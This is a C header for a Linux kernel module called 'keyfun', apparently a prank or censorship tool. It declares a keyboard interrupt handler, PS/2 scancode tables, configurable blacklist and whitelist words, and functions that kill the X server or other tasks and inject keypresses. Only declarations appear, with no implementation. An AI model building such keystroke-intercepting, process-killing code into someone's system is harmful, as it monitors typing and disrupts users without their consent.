#ifndef KEYFUN_H
#define KEYFUN_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/slab.h>
#include <asm/io.h>
#include <linux/sched/signal.h>
#include <linux/signal.h>
#include <linux/sched.h>
#include <asm/siginfo.h>
#include <linux/delay.h>

#include "config.h"

typedef struct {
    char* word;
    uint8_t target_idx;
    uint8_t word_len;
    uint8_t halfway_idx; 
} word_target;

static const char* blacklist_words[] = { BLACKLIST };
static uint8_t blacklist_n = sizeof(blacklist_words) / sizeof(char*);

static const char* whitelist_words[] = { WHITELIST };
static const uint8_t whitelist_completion[] = { N_MATCH_COMPLET };
static uint8_t whitelist_n = sizeof(whitelist_words) / sizeof(char*);

word_target** blacklist; 
word_target** whitelist; 

static uint8_t strike = 0; 
static char ps2_alph[26] = {
    0x1e, 0x30, 0x2e, 0x20, 0x12, 0x21, 0x22, 0x23,
    0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18, 0x19,
    0x10, 0x13, 0x1f, 0x14, 0x16, 0x2f, 0x11, 0x2d,
    0x15, 0x2c
};

/* Set 2 alpha scancodes */
//    0x1c, 0x32, 0x21, 0x23, 0x24, 0x2b, 0x34, 0x33, 0x43, 0x43, 
//    0x3b, 0x42, 0x4b, 0x3a, 0x31, 0x44, 0x4d, 0x15, 0x2d, 0x1b, 0x2c, 
//    0x3c, 0x2a, 0x1d, 0x22, 0x35,
/* Set 2 num scancodes */
//    0x1a, 0x45, 0x16, 0x1e, 0x26, 0x25, 0x2e, 0x36, 0x3d, 0x3e, 0x46

static char ps2_num[9] = {
    0x0b, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09
};

static char ps2_other[1] = {
    0x39
};

static void kill_xorg(void);

static void kill_task(struct task_struct* victim);

static irqreturn_t kbd_isr(int irq, void* dev_id);

static irqreturn_t kbd_isr_quick(int irq, void* dev_id);

static void press_key(char c);

static int  __init keyfun_init(void);

static void __exit keyfun_cleanup(void);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Young G");
MODULE_DESCRIPTION("Don't worry about no description my g");

module_init(keyfun_init);
module_exit(keyfun_cleanup);

#endif
